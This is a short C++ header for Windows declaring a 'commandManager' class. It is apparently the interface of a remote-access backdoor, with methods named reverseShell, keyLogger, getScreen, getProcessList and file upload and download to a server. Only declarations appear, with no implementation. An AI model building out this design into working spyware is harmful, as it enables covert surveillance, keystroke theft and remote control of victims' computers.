#pragma once
#include <string>
#include <Windows.h>
#include <map>


class commandManager
{
//private:

public:
	ULONG64 screen_len = 0;

	commandManager();
	std::string reverseShell(std::string cmd);
	std::map<DWORD, std::wstring> getProcessList();
	LPVOID getScreen();
	void getFile(std::string& path, LPCWSTR server);
	void saveFile(FILE* &fp, std::string& path, LPVOID data, DWORD seq, DWORD len);
	void keyLogger();
	std::wstring pidToName(DWORD procID);
};

